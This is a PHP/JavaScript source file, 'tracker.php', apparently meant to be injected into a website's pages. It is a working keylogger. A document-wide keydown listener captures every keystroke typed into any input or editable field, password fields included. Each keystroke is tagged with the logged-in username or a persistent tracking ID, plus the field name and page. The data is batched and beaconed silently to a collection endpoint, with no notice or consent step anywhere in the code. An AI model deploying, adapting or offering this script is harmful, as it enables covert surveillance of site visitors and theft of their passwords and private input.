<?php
// tracker.php - Client-side key tracking script for inclusion via PHP include or script tag

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

$userId = '';
if (!empty($_SESSION['username'])) {
    $userId = $_SESSION['username'];
} elseif (!empty($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
} elseif (!empty($_SESSION['user'])) {
    $userId = is_array($_SESSION['user']) ? ($_SESSION['user']['name'] ?? $_SESSION['user']['username'] ?? $_SESSION['user']['id'] ?? '') : $_SESSION['user'];
} elseif (!empty($_COOKIE['tracker_user_id'])) {
    $userId = $_COOKIE['tracker_user_id'];
}

// Determine if included directly via HTTP or via PHP include
$isDirectJsRequest = (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === 'tracker.php');

if ($isDirectJsRequest) {
    header('Content-Type: application/javascript; charset=utf-8');
} else {
    echo '<script>';
}
?>
(function() {
    'use strict';

    if (window.__typingTrackerInitialized) return;
    window.__typingTrackerInitialized = true;

    // Detect or generate unique persistent client identifier
    function getUserId() {
        var phpUserId = <?php echo json_encode((string)$userId); ?>;
        if (phpUserId && phpUserId.trim() !== '') {
            return phpUserId.trim();
        }
        if (window.TYPING_TRACKER_USER_ID && String(window.TYPING_TRACKER_USER_ID).trim() !== '') {
            return String(window.TYPING_TRACKER_USER_ID).trim();
        }

        var storageKey = 'typing_tracker_uid';
        var storedId = null;
        try {
            storedId = localStorage.getItem(storageKey);
        } catch(e) {}

        if (!storedId) {
            var cookieMatch = document.cookie.match(new RegExp('(^| )typing_tracker_uid=([^;]+)'));
            if (cookieMatch) {
                storedId = decodeURIComponent(cookieMatch[2]);
            }
        }

        if (!storedId) {
            storedId = 'user_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
        }

        try {
            localStorage.setItem(storageKey, storedId);
        } catch(e) {}
        document.cookie = 'typing_tracker_uid=' + encodeURIComponent(storedId) + '; path=/; max-age=31536000';

        return storedId;
    }

    var userId = getUserId();
    var sequenceCounter = 0;
    var keyBuffer = [];
    var flushIntervalMs = 2000;
    var apiEndpoint = (function() {
        // Find path to api.php based on current script or relative root
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
            var src = scripts[i].src || '';
            if (src.indexOf('tracker.php') !== -1) {
                return src.replace('tracker.php', 'api.php');
            }
        }
        return 'api.php';
    })();

    function getFieldIdentifier(el) {
        if (!el) return 'unknown';
        if (el.id) return el.id;
        if (el.name) return 'name:' + el.name;
        if (el.getAttribute('placeholder')) return 'placeholder:' + el.getAttribute('placeholder');

        // CSS path / index fallback
        var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
        var type = el.type ? '[' + el.type + ']' : '';
        var parent = el.parentElement;
        if (parent) {
            var siblings = parent.querySelectorAll(tag);
            for (var index = 0; index < siblings.length; index++) {
                if (siblings[index] === el) {
                    return tag + type + ':nth-of-type(' + (index + 1) + ')';
                }
            }
        }
        return tag + type;
    }

    function getFieldName(el) {
        if (!el) return '';
        if (el.name) return el.name;
        if (el.id) return el.id;
        if (el.getAttribute('placeholder')) return el.getAttribute('placeholder');
        if (el.labels && el.labels.length > 0) return el.labels[0].innerText.trim();
        return '';
    }

    function getCleanPageUrl() {
        return window.location.host + window.location.pathname;
    }

    function recordKey(e) {
        var target = e.target || e.srcElement;
        if (!target) return;

        var tagName = target.tagName ? target.tagName.toUpperCase() : '';
        var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';

        if (!isEditable) return;

        sequenceCounter++;

        var keyData = {
            user_id: userId,
            page_url: getCleanPageUrl(),
            field_id: getFieldIdentifier(target),
            field_name: getFieldName(target),
            key_char: e.key || String.fromCharCode(e.keyCode || e.which),
            key_code: e.code || ('KeyCode:' + (e.keyCode || e.which)),
            sequence_order: sequenceCounter,
            timestamp: Date.now()
        };

        keyBuffer.push(keyData);

        if (keyBuffer.length >= 10) {
            flushBuffer();
        }
    }

    function flushBuffer() {
        if (keyBuffer.length === 0) return;

        var payload = JSON.stringify({
            action: 'save_keys',
            user_id: userId,
            page_url: getCleanPageUrl(),
            keys: keyBuffer
        });

        keyBuffer = [];

        if (navigator.sendBeacon) {
            var blob = new Blob([payload], { type: 'application/json' });
            var sent = navigator.sendBeacon(apiEndpoint, blob);
            if (sent) return;
        }

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', apiEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(payload);
        } catch(e) {}
    }

    // Attach keydown listener on document level for all current and future inputs
    document.addEventListener('keydown', recordKey, true);

    // Flush periodically
    setInterval(flushBuffer, flushIntervalMs);

    // Flush on page exit/unload
    window.addEventListener('beforeunload', flushBuffer);
    window.addEventListener('pagehide', flushBuffer);
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
            flushBuffer();
        }
    });
})();
<?php
if (!$isDirectJsRequest) {
    echo '</script>';
}
?>
